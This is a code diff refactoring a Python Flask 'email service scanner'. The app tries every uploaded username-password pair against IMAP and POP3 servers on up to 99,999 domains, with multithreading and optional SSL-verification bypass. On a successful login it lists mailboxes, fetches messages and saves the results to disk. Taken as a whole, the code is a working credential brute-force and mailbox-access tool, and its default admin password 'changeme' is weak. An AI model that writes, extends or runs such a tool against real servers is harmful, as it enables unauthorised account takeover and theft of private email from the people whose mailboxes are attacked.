@@ -1,512 +1,492 @@
 #!/usr/bin/env python3
-"""
-Flask-based Email Service Scanner with Real-Time Progress & Disk Saving
-Minimalistic, terminal-like interface. Upload domains, usernames, and passwords.
-Tests all username-password combinations against IMAP/POP3 services.
-On success: saves credentials and fetched messages to disk (under ./scans/<domain>/).
-Progress log limited to 200 lines; successes shown in a separate div.
-"""
-
-import concurrent.futures
-import logging
-import socket
-import ssl
+import os
 import time
 import json
-import threading
 import queue
-import os
+import threading
+import hashlib
+import logging
+import ssl
+import socket
+from pathlib import Path
+from dataclasses import dataclass, field, asdict
+from typing import List, Tuple, Optional, Iterator, Dict, Any
+from itertools import product
+from concurrent.futures import ThreadPoolExecutor
+from functools import wraps
+import secrets
+import flask
 from flask import Flask, request, render_template_string, Response, jsonify
 from imaplib import IMAP4, IMAP4_SSL
-from poplib import POP3, POP3_SSL, error_proto as POPError
+from poplib import POP3, POP3_SSL
+import werkzeug
 
-# ---------- Flask App ----------
+# -------------------- Configuration --------------------
 app = Flask(__name__)
-app.secret_key = 'insecure-dev-key-change-in-production'
+app.secret_key = os.environ.get('SECRET_KEY', secrets.token_urlsafe(32))
 
-# ---------- Default Configuration ----------
+# Enable logging to see what's happening on the server
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
+
+BASIC_AUTH_USER = os.environ.get('SCANNER_USER', 'admin')
+BASIC_AUTH_PASS = os.environ.get('SCANNER_PASS', 'changeme')
+
+MAX_DOMAINS = 99999
+MAX_USERNAMES = 9999
+MAX_PASSWORDS = 9999
+MAX_THREADS = 20
+MAX_FETCH_MSGS = 100
 DEFAULT_TIMEOUT = 10
 DEFAULT_MAX_MSGS = 10
-DEFAULT_THREADS = 5
-PROGRESS_INTERVAL = 10          # Send an update every N credential attempts
-HEARTBEAT_INTERVAL = 10         # Send heartbeat if no messages for 10 seconds
-SCAN_OUTPUT = "scans"           # Base directory for saving successful results
+DEFAULT_THREADS = 1
+HEARTBEAT_INTERVAL = 10
+SCAN_OUTPUT = Path("scans")
 
-# IMAP: (port, use_ssl, use_starttls)
-IMAP_PORTS = [
-    (143, False, True),   # Plain with STARTTLS
-    (993, True, False),   # SSL
+@dataclass
+class IMAPService:
+    port: int
+    use_ssl: bool
+    use_starttls: bool
+
+@dataclass
+class POP3Service:
+    port: int
+    use_ssl: bool
+
+IMAP_SERVICES = [
+    IMAPService(143, False, True),
+    IMAPService(993, True, False),
 ]
 
-# POP3: (port, use_ssl)
-POP3_PORTS = [
-    (110, False),         # Plain
-    (995, True),          # SSL
+POP3_SERVICES = [
+    POP3Service(110, False),
+    POP3Service(995, True),
 ]
 
-# ---------- Helper Functions ----------
-def safe_decode(data):
-    if isinstance(data, bytes):
-        return data.decode('utf-8', errors='ignore')
-    return data
+# -------------------- Authentication --------------------
+def require_auth(f):
+    @wraps(f)
+    def decorated(*args, **kwargs):
+        auth = request.authorization
+        if not (auth and auth.username == BASIC_AUTH_USER and auth.password == BASIC_AUTH_PASS):
+            return Response('Authentication required\n', 401,
+                            {'WWW-Authenticate': 'Basic realm="Email Scanner"'})
+        return f(*args, **kwargs)
+    return decorated
 
-def create_ssl_context(no_verify):
+# -------------------- Structured Results --------------------
+class AuthStatus:
+    SUCCESS = "success"
+    CONN_REFUSED = "connection_refused"
+    TIMEOUT = "timeout"
+    SSL_ERROR = "ssl_error"
+    AUTH_FAILED = "auth_failed"
+    PROTOCOL_ERROR = "protocol_error"
+    UNKNOWN = "unknown"
+
+@dataclass
+class AuthAttempt:
+    domain: str
+    service: str
+    port: int
+    username: str
+    password_hash: str
+    status: str
+    message_count: int = 0
+    total_size: int = 0
+    fetched: int = 0
+    error_detail: str = ""
+    elapsed: float = 0.0
+    timestamp: float = field(default_factory=time.time)
+
+@dataclass
+class ServiceResult:
+    service: str
+    port: int
+    encryption: str
+    successes: List[AuthAttempt] = field(default_factory=list)
+    failures: List[AuthAttempt] = field(default_factory=list)
+
+@dataclass
+class DomainResult:
+    domain: str
+    services: Dict[str, ServiceResult] = field(default_factory=dict)
+
+# -------------------- Helper Functions --------------------
+def safe_decode(data: bytes, max_len: int = 4096) -> str:
+    return data[:max_len].decode('utf-8', errors='ignore')
+
+def create_ssl_context(no_verify: bool) -> ssl.SSLContext:
     context = ssl.create_default_context()
     if no_verify:
         context.check_hostname = False
         context.verify_mode = ssl.CERT_NONE
     return context
 
-# ---------- IMAP Handling with Progress Callback and Disk Saving ----------
-def check_imap(domain, port, use_ssl, use_starttls, creds, timeout, max_msgs,
-               ssl_context, fetch_all, fetch_emails, output_dir, service_prefix,
-               progress_callback=None):
-    """
-    Attempt IMAP connection. Returns (success, summary_dict).
-    On success, saves credentials and messages to output_dir with service_prefix.
-    Calls progress_callback(current, total) after each credential attempt.
-    """
-    conn = None
-    summary = {
-        "port": port,
-        "service": "IMAP",
-        "encryption": "SSL" if use_ssl else "STARTTLS" if use_starttls else "plain",
-        "success": False,
-        "credentials_used": None,
-        "capabilities": [],
-        "mailboxes": [],
-        "message_count": 0,
-        "fetched": 0,
-        "messages": [],        # keep small snippets for UI
-        "error": None
-    }
-
-    try:
-        if use_ssl:
-            conn = IMAP4_SSL(domain, port, timeout=timeout, ssl_context=ssl_context)
-        else:
-            conn = IMAP4(domain, port, timeout=timeout)
-            if use_starttls:
-                conn.starttls(ssl_context=ssl_context)
-    except Exception as e:
-        summary["error"] = f"Connection failed: {e}"
-        return False, summary
-
-    total_creds = len(creds)
-    for idx, (user, passwd) in enumerate(creds, 1):
+# -------------------- Protocol Handlers --------------------
+class IMAPHandler:
+    @staticmethod
+    def probe(domain: str, svc: IMAPService, timeout: int, no_verify: bool) -> Optional[str]:
         try:
-            conn.login(user, passwd)
-            summary["success"] = True
-            summary["credentials_used"] = f"{user}:{passwd}"
+            if svc.use_ssl:
+                with IMAP4_SSL(domain, svc.port, timeout=timeout,
+                               ssl_context=create_ssl_context(no_verify)):
+                    return "SSL"
+            else:
+                with IMAP4(domain, svc.port, timeout=timeout) as conn:
+                    if svc.use_starttls:
+                        conn.starttls(ssl_context=create_ssl_context(no_verify))
+                        return "STARTTLS"
+                    return "plain"
+        except Exception as e:
+            logging.debug(f"IMAP probe failed for {domain}:{svc.port}: {e}")
+            return None
 
-            # Save credentials to disk
-            cred_file = os.path.join(output_dir, f"success_{service_prefix}.txt")
-            try:
-                with open(cred_file, 'w') as f:
-                    f.write(f"{user}:{passwd}\n")
-            except Exception as e:
-                logging.error(f"Failed to write credentials for {domain} {service_prefix}: {e}")
-
-            # Fetch capabilities (optional, not saved)
-            try:
-                typ, data = conn.capability()
-                caps = safe_decode(data[0]).split()
-                summary["capabilities"] = caps
-            except Exception:
-                pass
-
-            # List mailboxes
-            mailbox_names = []
-            try:
+    @staticmethod
+    def attempt(domain: str, svc: IMAPService, username: str, password: str,
+                timeout: int, no_verify: bool, fetch_emails: bool,
+                max_msgs: int, fetch_all: bool) -> Tuple[str, AuthAttempt]:
+        attempt = AuthAttempt(
+            domain=domain,
+            service="IMAP",
+            port=svc.port,
+            username=username,
+            password_hash=hashlib.sha256(password.encode()).hexdigest()[:16],
+            status=AuthStatus.UNKNOWN,
+        )
+        start = time.time()
+        conn = None
+        status = AuthStatus.UNKNOWN
+        try:
+            if svc.use_ssl:
+                conn = IMAP4_SSL(domain, svc.port, timeout=timeout,
+                                 ssl_context=create_ssl_context(no_verify))
+            else:
+                conn = IMAP4(domain, svc.port, timeout=timeout)
+                if svc.use_starttls:
+                    conn.starttls(ssl_context=create_ssl_context(no_verify))
+            conn.login(username, password)
+            status = AuthStatus.SUCCESS
+            if fetch_emails:
                 typ, data = conn.list()
+                mailboxes = []
                 for item in data:
                     decoded = safe_decode(item)
                     if decoded.startswith('* LIST'):
                         parts = decoded.split('"')
-                        if len(parts) >= 2:
-                            name = parts[1]
-                        else:
-                            name = decoded.split()[-1]
+                        name = parts[1] if len(parts) >= 2 else decoded.split()[-1]
                     else:
                         name = decoded.split()[-1]
-                    mailbox_names.append(name.strip('"'))
-            except Exception:
-                pass
-            summary["mailboxes"] = mailbox_names
-
-            # Select INBOX (or first mailbox)
-            target_mbox = "INBOX"
-            try:
-                typ, data = conn.select(target_mbox)
-            except Exception:
-                if mailbox_names:
-                    target_mbox = mailbox_names[0]
-                    try:
-                        typ, data = conn.select(target_mbox)
-                    except Exception:
-                        data = [0]
-                else:
-                    data = [0]
-
-            msg_count = int(data[0]) if data and data[0] else 0
-            summary["message_count"] = msg_count
-
-            # Fetch messages if requested
-            if fetch_emails and msg_count > 0:
-                fetch_limit = msg_count if fetch_all else min(msg_count, max_msgs)
-                fetched = 0
-                for i in range(1, fetch_limit + 1):
-                    try:
-                        typ, data = conn.fetch(str(i), "(RFC822)")
-                        raw_email = data[0][1]
-
-                        # Save full message to disk
-                        msg_file = os.path.join(output_dir, f"{service_prefix}_msg_{i}.eml")
-                        try:
-                            with open(msg_file, 'wb') as f:
-                                f.write(raw_email)
-                        except Exception as e:
-                            logging.error(f"Failed to write message {i} for {domain}: {e}")
-
-                        # Keep snippet for UI
-                        snippet = safe_decode(raw_email)[:200] + "..."
-                        summary["messages"].append(f"Message {i}:\n{snippet}")
-                        fetched += 1
-                        time.sleep(0.2)
-                    except Exception as e:
-                        logging.debug(f"Failed to fetch message {i}: {e}")
-                summary["fetched"] = fetched
-
+                    mailboxes.append(name.strip('"'))
+                target = "INBOX" if "INBOX" in mailboxes else (mailboxes[0] if mailboxes else None)
+                if target:
+                    typ, data = conn.select(target)
+                    msg_count = int(data[0]) if data and data[0] else 0
+                    attempt.message_count = msg_count
+                    if msg_count > 0:
+                        fetch_limit = msg_count if fetch_all else min(msg_count, max_msgs)
+                        fetched = 0
+                        for i in range(1, fetch_limit + 1):
+                            try:
+                                typ, data = conn.fetch(str(i), "(RFC822)")
+                                fetched += 1
+                            except Exception as e:
+                                logging.debug(f"Failed to fetch msg {i}: {e}")
+                        attempt.fetched = fetched
             conn.close()
             conn.logout()
-            return True, summary
-
-        except Exception:
-            # Report progress
-            if progress_callback and (idx % PROGRESS_INTERVAL == 0 or idx == total_creds):
-                progress_callback(idx, total_creds, f"IMAP/{port}", domain)
-            continue
-
-    summary["error"] = "No valid credentials"
-    try:
-        conn.close()
-        conn.logout()
-    except:
-        pass
-    return False, summary
-
-# ---------- POP3 Handling with Progress Callback and Disk Saving ----------
-def check_pop3(domain, port, use_ssl, creds, timeout, max_msgs, ssl_context,
-               pop3_full, fetch_all, fetch_emails, output_dir, service_prefix,
-               progress_callback=None):
-    conn = None
-    summary = {
-        "port": port,
-        "service": "POP3",
-        "encryption": "SSL" if use_ssl else "plain",
-        "success": False,
-        "credentials_used": None,
-        "message_count": 0,
-        "total_size": 0,
-        "fetched": 0,
-        "messages": [],
-        "error": None
-    }
-
-    try:
-        if use_ssl:
-            conn = POP3_SSL(domain, port, timeout=timeout, context=ssl_context)
-        else:
-            conn = POP3(domain, port, timeout=timeout)
-    except Exception as e:
-        summary["error"] = f"Connection failed: {e}"
-        return False, summary
-
-    total_creds = len(creds)
-    for idx, (user, passwd) in enumerate(creds, 1):
-        try:
-            conn.user(user)
-            conn.pass_(passwd)
-            summary["success"] = True
-            summary["credentials_used"] = f"{user}:{passwd}"
-
-            # Save credentials to disk
-            cred_file = os.path.join(output_dir, f"success_{service_prefix}.txt")
-            try:
-                with open(cred_file, 'w') as f:
-                    f.write(f"{user}:{passwd}\n")
-            except Exception as e:
-                logging.error(f"Failed to write credentials for {domain} {service_prefix}: {e}")
-
-            msg_count, total_size = conn.stat()
-            summary["message_count"] = msg_count
-            summary["total_size"] = total_size
-
-            if fetch_emails and msg_count > 0:
-                fetch_limit = msg_count if fetch_all else min(msg_count, max_msgs)
-                fetched = 0
-                for i in range(1, fetch_limit + 1):
-                    try:
-                        if pop3_full:
-                            lines = conn.retr(i)[1]
-                            msg_content = "\n".join(safe_decode(l) for l in lines)
-                            raw_bytes = "\n".join(l.decode('latin1') if isinstance(l, bytes) else l for l in lines).encode('utf-8', errors='ignore')
-                        else:
-                            lines = conn.top(i, 0)[1]
-                            msg_header = "\n".join(safe_decode(l) for l in lines)
-                            raw_bytes = msg_header.encode('utf-8', errors='ignore')
-
-                        # Save full message to disk
-                        msg_file = os.path.join(output_dir, f"{service_prefix}_msg_{i}.eml")
-                        try:
-                            with open(msg_file, 'wb') as f:
-                                f.write(raw_bytes)
-                        except Exception as e:
-                            logging.error(f"Failed to write message {i} for {domain}: {e}")
-
-                        # Keep snippet for UI
-                        snippet = (msg_content if pop3_full else msg_header)[:200] + "..."
-                        summary["messages"].append(f"Message {i}:\n{snippet}")
-                        fetched += 1
-                        time.sleep(0.2)
-                    except Exception as e:
-                        logging.debug(f"Failed to fetch message {i}: {e}")
-                summary["fetched"] = fetched
-
-            conn.quit()
-            return True, summary
-
-        except Exception:
-            if progress_callback and (idx % PROGRESS_INTERVAL == 0 or idx == total_creds):
-                progress_callback(idx, total_creds, f"POP3/{port}", domain)
-            continue
-
-    summary["error"] = "No valid credentials"
-    try:
-        conn.quit()
-    except:
-        pass
-    return False, summary
-
-# ---------- Threaded Scanner with Queue ----------
-def scan_domain_thread(domain, creds, timeout, max_msgs, no_ssl_verify,
-                       fetch_all, pop3_full, fetch_emails, msg_queue):
-    """Run scans for a domain and put messages into the queue."""
-    # Send domain start message
-    msg_queue.put({
-        "type": "domain_start",
-        "domain": domain
-    })
-
-    ssl_context = create_ssl_context(no_ssl_verify)
-    domain_result = {
-        "domain": domain,
-        "services": []
-    }
-
-    # Prepare output directory for this domain (will be created only if success occurs)
-    base_out = os.path.join(SCAN_OUTPUT, domain)
-    os.makedirs(base_out, exist_ok=True)  # will exist even if no success, but we keep it
-
-    # Helper to queue progress messages
-    def progress_callback(current, total, service, domain):
-        msg_queue.put({
-            "type": "attempt",
-            "domain": domain,
-            "service": service,
-            "current": current,
-            "total": total
-        })
-
-    # IMAP checks
-    for port, use_ssl, use_starttls in IMAP_PORTS:
-        service_prefix = f"imap_{port}"
-        success, svc_summary = check_imap(
-            domain, port, use_ssl, use_starttls,
-            creds, timeout, max_msgs, ssl_context, fetch_all, fetch_emails,
-            base_out, service_prefix,
-            progress_callback=progress_callback
-        )
-        svc_summary["domain"] = domain
-        domain_result["services"].append(svc_summary)
-        if success:
-            msg_queue.put({
-                "type": "success",
-                "domain": domain,
-                "service": f"IMAP/{port} ({svc_summary['encryption']})",
-                "credentials": svc_summary['credentials_used'],
-                "msg_count": svc_summary['message_count'],
-                "fetched": svc_summary['fetched'],
-                "saved_to": os.path.join(base_out, service_prefix)  # indicate where files are saved
-            })
-
-    # POP3 checks
-    for port, use_ssl in POP3_PORTS:
-        service_prefix = f"pop3_{port}"
-        success, svc_summary = check_pop3(
-            domain, port, use_ssl,
-            creds, timeout, max_msgs, ssl_context, pop3_full, fetch_all, fetch_emails,
-            base_out, service_prefix,
-            progress_callback=progress_callback
-        )
-        svc_summary["domain"] = domain
-        domain_result["services"].append(svc_summary)
-        if success:
-            total_size_mb = svc_summary["total_size"] / (1024*1024) if svc_summary["total_size"] else 0
-            msg_queue.put({
-                "type": "success",
-                "domain": domain,
-                "service": f"POP3/{port} ({svc_summary['encryption']})",
-                "credentials": svc_summary['credentials_used'],
-                "msg_count": svc_summary['message_count'],
-                "size_mb": round(total_size_mb, 2),
-                "fetched": svc_summary['fetched'],
-                "saved_to": os.path.join(base_out, service_prefix)
-            })
-
-    # Signal completion for this domain
-    msg_queue.put({"type": "domain_done", "domain": domain, "result": domain_result})
-
-# ---------- Streaming Generator (inner function) ----------
-def generate_progress(domains, creds, timeout, max_msgs, no_ssl_verify,
-                      fetch_all, pop3_full, fetch_emails, threads):
-    """Generator that yields progress messages as JSON lines."""
-    # Send start message immediately
-    yield json.dumps({"type": "start", "total": len(domains)}) + "\n"
-
-    msg_queue = queue.Queue()
-    active_domains = len(domains)
-    lock = threading.Lock()
-
-    def domain_wrapper(domain):
-        nonlocal active_domains
-        try:
-            scan_domain_thread(domain, creds, timeout, max_msgs, no_ssl_verify,
-                               fetch_all, pop3_full, fetch_emails, msg_queue)
+        except (IMAP4.abort, IMAP4.error, socket.error, ssl.SSLError) as e:
+            attempt.error_detail = str(e)
+            if isinstance(e, (socket.timeout, TimeoutError)):
+                status = AuthStatus.TIMEOUT
+            elif isinstance(e, ssl.SSLError):
+                status = AuthStatus.SSL_ERROR
+            elif isinstance(e, IMAP4.error) and "authentication failed" in str(e).lower():
+                status = AuthStatus.AUTH_FAILED
+            else:
+                status = AuthStatus.PROTOCOL_ERROR
         except Exception as e:
-            # Send error to queue
-            msg_queue.put({"type": "error", "message": f"Domain {domain} failed: {str(e)}"})
+            attempt.error_detail = str(e)
+            status = AuthStatus.UNKNOWN
         finally:
-            with lock:
-                active_domains -= 1
+            if conn:
+                try:
+                    conn.close()
+                    conn.logout()
+                except:
+                    pass
+            attempt.elapsed = time.time() - start
+            attempt.status = status
+        return status, attempt
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = [executor.submit(domain_wrapper, domain) for domain in domains]
+class POP3Handler:
+    @staticmethod
+    def probe(domain: str, svc: POP3Service, timeout: int, no_verify: bool) -> Optional[str]:
+        try:
+            if svc.use_ssl:
+                with POP3_SSL(domain, svc.port, timeout=timeout,
+                              context=create_ssl_context(no_verify)):
+                    return "SSL"
+            else:
+                with POP3(domain, svc.port, timeout=timeout):
+                    return "plain"
+        except Exception as e:
+            logging.debug(f"POP3 probe failed for {domain}:{svc.port}: {e}")
+            return None
 
-        last_msg_time = time.time()
-        while active_domains > 0 or not msg_queue.empty():
-            try:
-                msg = msg_queue.get(timeout=HEARTBEAT_INTERVAL)
-                yield json.dumps(msg) + "\n"
-                last_msg_time = time.time()
-            except queue.Empty:
-                yield json.dumps({"type": "heartbeat", "time": time.time()}) + "\n"
-                # Check if any future failed
+    @staticmethod
+    def attempt(domain: str, svc: POP3Service, username: str, password: str,
+                timeout: int, no_verify: bool, fetch_emails: bool,
+                max_msgs: int, fetch_all: bool, pop3_full: bool) -> Tuple[str, AuthAttempt]:
+        attempt = AuthAttempt(
+            domain=domain,
+            service="POP3",
+            port=svc.port,
+            username=username,
+            password_hash=hashlib.sha256(password.encode()).hexdigest()[:16],
+            status=AuthStatus.UNKNOWN,
+        )
+        start = time.time()
+        conn = None
+        status = AuthStatus.UNKNOWN
+        try:
+            if svc.use_ssl:
+                conn = POP3_SSL(domain, svc.port, timeout=timeout,
+                                context=create_ssl_context(no_verify))
+            else:
+                conn = POP3(domain, svc.port, timeout=timeout)
+            conn.user(username)
+            conn.pass_(password)
+            status = AuthStatus.SUCCESS
+            if fetch_emails:
+                msg_count, total_size = conn.stat()
+                attempt.message_count = msg_count
+                attempt.total_size = total_size
+                if msg_count > 0:
+                    fetch_limit = msg_count if fetch_all else min(msg_count, max_msgs)
+                    fetched = 0
+                    for i in range(1, fetch_limit + 1):
+                        try:
+                            if pop3_full:
+                                lines = conn.retr(i)[1]
+                            else:
+                                lines = conn.top(i, 0)[1]
+                            fetched += 1
+                        except Exception as e:
+                            logging.debug(f"Failed to fetch msg {i}: {e}")
+                    attempt.fetched = fetched
+            conn.quit()
+        except (POP3.error_proto, socket.error, ssl.SSLError) as e:
+            attempt.error_detail = str(e)
+            if isinstance(e, (socket.timeout, TimeoutError)):
+                status = AuthStatus.TIMEOUT
+            elif isinstance(e, ssl.SSLError):
+                status = AuthStatus.SSL_ERROR
+            elif "-ERR" in str(e) and "auth" in str(e).lower():
+                status = AuthStatus.AUTH_FAILED
+            else:
+                status = AuthStatus.PROTOCOL_ERROR
+        except Exception as e:
+            attempt.error_detail = str(e)
+            status = AuthStatus.UNKNOWN
+        finally:
+            if conn:
+                try:
+                    conn.quit()
+                except:
+                    pass
+            attempt.elapsed = time.time() - start
+            attempt.status = status
+        return status, attempt
+
+# -------------------- Scanner Orchestrator --------------------
+class Scanner:
+    def __init__(self, domains: List[str], usernames: List[str], passwords: List[str],
+                 timeout: int, max_msgs: int, threads: int,
+                 fetch_all: bool, pop3_full: bool, no_ssl_verify: bool, fetch_emails: bool):
+        self.domains = domains
+        self.usernames = usernames
+        self.passwords = passwords
+        self.timeout = timeout
+        self.max_msgs = max_msgs
+        self.threads = min(threads, MAX_THREADS)
+        self.fetch_all = fetch_all
+        self.pop3_full = pop3_full
+        self.no_ssl_verify = no_ssl_verify
+        self.fetch_emails = fetch_emails
+
+        self.total_creds = len(usernames) * len(passwords)
+        self.event_queue = queue.Queue()
+        self.stop_event = threading.Event()
+        self.host_semaphore = threading.Semaphore(self.threads)
+
+    def creds_iter(self) -> Iterator[Tuple[str, str]]:
+        return product(self.usernames, self.passwords)
+
+    def run(self):
+        """Start scanning domains with thread pool."""
+        logging.info("Scanner thread started")
+        try:
+            with ThreadPoolExecutor(max_workers=self.threads) as executor:
+                futures = [executor.submit(self.scan_domain, domain) for domain in self.domains]
                 for f in futures:
-                    if f.done() and f.exception():
-                        yield json.dumps({"type": "error", "message": str(f.exception())}) + "\n"
+                    # Wait for each domain to complete, propagate exceptions
+                    try:
+                        f.result()
+                    except Exception as e:
+                        logging.error(f"Domain scan failed: {e}")
+                        self.event_queue.put({"type": "error", "message": str(e)})
+            self.event_queue.put({"type": "all_done"})
+            logging.info("Scanner thread finished")
+        except Exception as e:
+            logging.error(f"Fatal error in scanner thread: {e}")
+            self.event_queue.put({"type": "error", "message": f"Scanner thread crashed: {e}"})
 
-    yield json.dumps({"type": "all_done"}) + "\n"
+    def scan_domain(self, domain: str):
+        """Scan one domain: probe services, then try credentials."""
+        logging.debug(f"Starting scan for domain: {domain}")
+        # Probe services
+        available_services = []
+        for svc in IMAP_SERVICES:
+            enc = IMAPHandler.probe(domain, svc, self.timeout, self.no_ssl_verify)
+            if enc:
+                available_services.append(('IMAP', svc, enc))
+        for svc in POP3_SERVICES:
+            enc = POP3Handler.probe(domain, svc, self.timeout, self.no_ssl_verify)
+            if enc:
+                available_services.append(('POP3', svc, enc))
 
-# ---------- HTML Template ----------
-INDEX_HTML = """
-<!DOCTYPE html>
-<html lang="en">
+        if not available_services:
+            logging.debug(f"No services available for {domain}")
+            self.event_queue.put({"type": "domain_done", "domain": domain, "result": None})
+            return
+
+        self.event_queue.put({"type": "domain_start", "domain": domain,
+                              "services": [f"{proto}/{svc.port}" for proto, svc, enc in available_services]})
+
+        domain_result = DomainResult(domain=domain)
+        attempt_count = 0
+        total_attempts = self.total_creds * len(available_services)
+
+        for proto, svc, enc in available_services:
+            svc_key = f"{proto}/{svc.port}"
+            svc_result = ServiceResult(service=proto, port=svc.port, encryption=enc)
+            domain_result.services[svc_key] = svc_result
+
+            for username, password in self.creds_iter():
+                if self.stop_event.is_set():
+                    return
+                attempt_count += 1
+                with self.host_semaphore:
+                    if proto == 'IMAP':
+                        status, attempt = IMAPHandler.attempt(
+                            domain, svc, username, password,
+                            self.timeout, self.no_ssl_verify,
+                            self.fetch_emails, self.max_msgs, self.fetch_all
+                        )
+                    else:
+                        status, attempt = POP3Handler.attempt(
+                            domain, svc, username, password,
+                            self.timeout, self.no_ssl_verify,
+                            self.fetch_emails, self.max_msgs, self.fetch_all, self.pop3_full
+                        )
+
+                # Emit progress AFTER EVERY attempt
+                self.event_queue.put({
+                    "type": "attempt",
+                    "domain": domain,
+                    "service": svc_key,
+                    "current": attempt_count,
+                    "total": total_attempts
+                })
+
+                if status == AuthStatus.SUCCESS:
+                    svc_result.successes.append(attempt)
+                    self._persist_success(domain, svc_key, username, attempt)
+                    self.event_queue.put({
+                        "type": "success",
+                        "domain": domain,
+                        "service": svc_key,
+                        "credentials": f"{username}:{password}",
+                        "msg_count": attempt.message_count,
+                        "fetched": attempt.fetched,
+                        "saved_to": str(SCAN_OUTPUT / domain / svc_key / username)
+                    })
+                else:
+                    svc_result.failures.append(attempt)
+
+        self.event_queue.put({"type": "domain_done", "domain": domain, "result": domain_result})
+        logging.debug(f"Finished domain: {domain}")
+
+    def _persist_success(self, domain: str, service: str, username: str, attempt: AuthAttempt):
+        base = SCAN_OUTPUT / domain / service / username
+        base.mkdir(parents=True, exist_ok=True)
+        with open(base / "credentials.txt", 'w') as f:
+            f.write(f"username: {username}\npassword_hash: {attempt.password_hash}\n")
+        with open(base / "summary.json", 'w') as f:
+            json.dump(asdict(attempt), f, indent=2)
+
+# -------------------- SSE Event Stream --------------------
+def event_stream(scanner: Scanner):
+    """Generator that yields SSE messages."""
+    logging.info("event_stream started")
+    # Send start event
+    start_msg = json.dumps({'total': len(scanner.domains)})
+    yield f"event: start\ndata: {start_msg}\n\n"
+    logging.info(f"Sent start event: {start_msg}")
+
+    # Optionally send a test event to verify stream is working
+    yield f"event: test\ndata: {{\"message\": \"SSE stream is alive\"}}\n\n"
+
+    def scanner_thread():
+        scanner.run()
+
+    thread = threading.Thread(target=scanner_thread, daemon=True)
+    thread.start()
+
+    while True:
+        try:
+            msg = scanner.event_queue.get(timeout=HEARTBEAT_INTERVAL)
+            logging.debug(f"Yielding event: {msg['type']}")
+            yield f"event: {msg['type']}\ndata: {json.dumps(msg)}\n\n"
+        except queue.Empty:
+            logging.debug("Heartbeat")
+            yield f"event: heartbeat\ndata: {time.time()}\n\n"
+            if not thread.is_alive():
+                logging.info("Scanner thread died, finishing stream")
+                break
+    yield "event: done\ndata: {}\n\n"
+    logging.info("event_stream finished")
+
+# -------------------- HTML Template (with debug console) --------------------
+INDEX_HTML = """<!DOCTYPE html>
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>emailscanner · terminal</title>
     <style>
-        body {
-            background-color: #000;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            line-height: 1.4;
-            margin: 20px;
-        }
-        h1, h2 {
-            color: #0f0;
-            border-bottom: 1px solid #0f0;
-            font-weight: normal;
-        }
-        form {
-            border: 1px solid #0f0;
-            padding: 15px;
-            max-width: 800px;
-        }
-        label {
-            display: inline-block;
-            width: 150px;
-        }
-        input, textarea, select {
-            background-color: #111;
-            color: #0f0;
-            border: 1px solid #0f0;
-            font-family: 'Courier New', monospace;
-            padding: 5px;
-            margin: 5px 0;
-            width: 300px;
-        }
-        input[type="file"] {
-            width: auto;
-        }
-        input[type="checkbox"] {
-            width: auto;
-            margin-left: 150px;
-        }
-        button {
-            background-color: #000;
-            color: #0f0;
-            border: 2px solid #0f0;
-            padding: 10px 20px;
-            font-family: 'Courier New', monospace;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-        button:hover {
-            background-color: #0f0;
-            color: #000;
-        }
-        .note {
-            color: #888;
-            font-size: 12px;
-            margin-top: 10px;
-        }
-        hr {
-            border: none;
-            border-top: 1px dashed #0f0;
-        }
-        #progress {
-            margin-top: 20px;
-            border: 1px solid #0f0;
-            padding: 10px;
-            max-height: 400px;
-            overflow-y: auto;
-            background-color: #111;
-        }
-        #successes {
-            margin-top: 20px;
-            border: 1px solid #0f0;
-            padding: 10px;
-            max-height: 200px;
-            overflow-y: auto;
-            background-color: #111;
-        }
-        #successes .success-item { color: #0f0; }
-        #results {
-            margin-top: 20px;
-        }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; font-size: 14px; margin: 20px; }
+        h1, h2 { color: #0f0; border-bottom: 1px solid #0f0; font-weight: normal; }
+        form { border: 1px solid #0f0; padding: 15px; max-width: 800px; }
+        label { display: inline-block; width: 150px; }
+        input, textarea, select { background: #111; color: #0f0; border: 1px solid #0f0; padding: 5px; margin: 5px 0; width: 300px; }
+        input[type="file"] { width: auto; }
+        input[type="checkbox"] { width: auto; margin-left: 150px; }
+        button { background: #000; color: #0f0; border: 2px solid #0f0; padding: 10px 20px; font-family: inherit; font-size: 16px; cursor: pointer; }
+        button:hover { background: #0f0; color: #000; }
+        .note { color: #888; font-size: 12px; }
+        #progress, #successes { margin-top: 20px; border: 1px solid #0f0; padding: 10px; max-height: 400px; overflow-y: auto; background: #111; }
+        #successes { max-height: 200px; }
         .hidden { display: none; }
+        #debug { color: #888; font-size: 12px; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <h1>📧 EMAIL SERVICE SCANNER (IMAP/POP3)</h1>
-    <p>Upload username & password files. All combinations will be tested against each domain. Successful logins save credentials and messages to disk (./scans/&lt;domain&gt;/).</p>
+    <h1>EMAIL SERVICE SCANNER</h1>
     <form id="scanForm" enctype="multipart/form-data">
-        <label>Domains (one per line):</label><br>
-        <textarea name="domains" rows="6" cols="50" placeholder="example.com&#10;test.org"></textarea><br>
+        <label>Domains (textarea):</label><br>
+        <textarea name="domains" rows="6" cols="50" placeholder="example.com"></textarea><br>
+        <label>Or domains file:</label>
+        <input type="file" name="domains_file" accept=".txt,.csv"><br>
 
         <label>Usernames file:</label>
         <input type="file" name="userfile" accept=".txt,.csv" required><br>
@@ -515,200 +495,149 @@ INDEX_HTML = """
 
         <label>Timeout (s):</label>
         <input type="number" name="timeout" value="10" min="1"><br>
+        <label>Max msgs to fetch:</label>
+        <input type="number" name="max_msgs" value="10" min="0" max="100"><br>
+        <label>Threads:</label>
+        <input type="number" name="threads" value="5" min="1" max="20"><br>
 
-        <label>Max messages to fetch:</label>
-        <input type="number" name="max_msgs" value="10" min="0"><br>
-
-        <label>Threads (domains in parallel):</label>
-        <input type="number" name="threads" value="3" min="1"><br>
-
-        <input type="checkbox" name="fetch_all" value="yes"> Fetch all messages (overrides max)<br>
-        <input type="checkbox" name="pop3_full" value="yes"> POP3: fetch full messages (instead of headers)<br>
-        <input type="checkbox" name="no_ssl_verify" value="yes"> Disable SSL verification (INSECURE)<br>
-        <input type="checkbox" name="fetch_emails" value="yes" checked> Fetch and display message snippets<br>
+        <input type="checkbox" name="fetch_all" value="yes"> Fetch all messages<br>
